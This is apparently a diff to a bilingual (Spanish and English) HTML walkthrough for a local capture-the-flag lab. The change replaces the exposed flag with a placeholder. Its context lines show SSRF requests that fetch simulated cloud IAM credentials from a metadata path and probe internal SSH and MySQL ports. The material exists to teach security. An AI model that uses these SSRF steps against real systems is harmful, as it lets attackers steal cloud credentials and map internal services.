@@ -41,7 +41,7 @@
         <pre>http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role</pre></li>
       <li>Obtén las credenciales AWS simuladas (flag incluida en el JSON):
         <pre>curl "http://localhost:5000/ssrf?url=http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role"</pre></li>
-      <li>Flag: <code>HL{55rf_cl0ud_m3t4d4t4}</code> (dentro de la respuesta JSON)</li>
+      <li>Flag: <code>HL{···}</code> (dentro de la respuesta JSON)</li>
       <li>Escanea puertos internos para detectar servicios:
         <pre>http://localhost:22    # detecta SSH
 http://localhost:3306  # detecta MySQL</pre></li>
@@ -74,7 +74,7 @@ http://localhost:3306  # detecta MySQL</pre></li>
         <pre>http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role</pre></li>
       <li>Retrieve the simulated AWS credentials (flag included in the JSON):
         <pre>curl "http://localhost:5000/ssrf?url=http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role"</pre></li>
-      <li>Flag: <code>HL{55rf_cl0ud_m3t4d4t4}</code> (inside the JSON response)</li>
+      <li>Flag: <code>HL{···}</code> (inside the JSON response)</li>
       <li>Scan internal ports to detect running services:
         <pre>http://localhost:22    # detects SSH
 http://localhost:3306  # detects MySQL</pre></li>
